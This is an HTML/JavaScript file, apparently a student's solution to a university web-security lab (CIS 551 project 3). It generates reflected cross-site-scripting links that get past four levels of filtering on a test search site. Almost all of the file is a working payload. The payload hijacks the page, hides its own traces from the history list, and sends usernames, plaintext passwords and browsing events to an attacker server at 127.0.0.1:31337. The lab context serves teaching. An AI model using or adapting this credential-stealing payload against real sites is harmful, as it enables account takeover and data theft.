<html>
<meta charset="utf-8">
<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js">
</script>
<script>
    // Extend this function:
    function payload(attacker) {
        function proxy(href, q) {
            $("body").load(href, function() {
                $("html").show();
                window.history.replaceState(window.history.state, null, href);
                $('#query').val(q);
                $("#history-list > a").each(function() {
                    if ($(this).text().includes("payload"))
                        $(this).hide();
                });
                var home = 'http://cis551.cis.upenn.edu/project3/';
                var ru = window.location.href;
                $.get(attacker + 'stolen?event=nav&user=' + $('#logged-in-user').text() + '&url=' + window.location.href);
                $('#search-btn').click(function(e) {
                    e.preventDefault();
                    var q = $('#query').val();
                    window.history.replaceState(q, null, href)
                    window.history.pushState(q, null, href);
                    proxy("./search?q=" + $('#query').val(), q);
                });
                $('#search-again-btn').click(function(e) {
                    e.preventDefault();
                    window.history.pushState('', null, href);
                    $.get(attacker + 'stolen?event=nav&user=' + $('#logged-in-user').text() + '&url=' + home + 'search');
                    proxy('./', null);
                });
                $('#log-in-btn').click(function(e) {
                    e.preventDefault();
                    window.history.pushState(null, null, href);
                    $.post("./login?csrfdefense=0", {
                            username: $('#username').val(),
                            password: $('#userpass').val()
                        })
                        .done(function(data) {
                            $.get(attacker + 'stolen?event=login&user=' + $('#username').val() + '&pass=' + $('#userpass').val());
                            proxy('./', null);
                        });
                });
                $('#log-out-btn').click(function(e) {
                    e.preventDefault();
                    window.history.pushState(null, null, href);
                    $.get(attacker + 'stolen?event=logout&user=' + $('#logged-in-user').text());
                    $.post("./logout?csrfdefense=0").done(function(data) {
                        proxy('./', null);
                    });
                });
                $('#new-account-btn').click(function(e) {
                    e.preventDefault();
                    window.history.pushState(null, null, href);
                    $.post("./create?csrfdefense=0", {
                        username: $('#username').val(),
                        password: $('#userpass').val()
                    }).done(function(data) {
                        $.get(attacker + 'stolen?event=login&user=' + $('#username').val() + '&pass=' + $('#userpass').val());
                        proxy('./', null);
                    });
                });
                $('#yay-lnk').click(function(e) {
                    e.preventDefault();
                    window.history.pushState(null, null, href);
                    proxy('./', null);
                });
                $('#history-list a').click(function(e) {
                    e.preventDefault();
                    window.history.pushState(null, null, href);
                    proxy("./" + $(this).attr("href"), null);
                });
                window.onpopstate = function(e) {
                    var q = e.state
                    proxy(window.location.href, q);
                };
            });
        }
        $("html").hide();
        proxy("./", null);
    }

    function makeLink(xssdefense, target, attacker) {
        if (xssdefense == 0) {
            return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
                encodeURIComponent("<script" + ">" + payload.toString() +
                    ";payload(\"" + attacker + "\");" + "</" + "script" + ">");
        } else if (xssdefense == 1) {
            var new_payload = payload.toString().replace(/'/g, "`")
            return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
                encodeURIComponent("<img src" + " onerror= '" + new_payload.toString() +
                    ";payload(\"" + attacker + "\");'" + ">" + "</" + "img" + ">");
        } else if (xssdefense == 2) {
            return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
                encodeURIComponent("<sscriptcript" + ">" + payload.toString() +
                    ";payload(\"" + attacker + "\");" + "</" + "sscriptcript" + ">");
        } else if (xssdefense == 3) {
            return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
                encodeURIComponent("<script" + ">" + payload.toString().replace(/;/g, "\n").replace(/['"]/g, "`") +
                    ";payload(`" + attacker + "`);" + "</" + "script" + ">");
        }
    }

    var xssdefense = 3;
    var target = `http://cis551.cis.upenn.edu/project3/`;
    var attacker = `http://127.0.0.1:31337/`;

    $(function() {
        var url = makeLink(xssdefense, target, attacker);
        console.log(url)
        $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Yay!</a>");
    });
</script>

<h3></h3>

</html>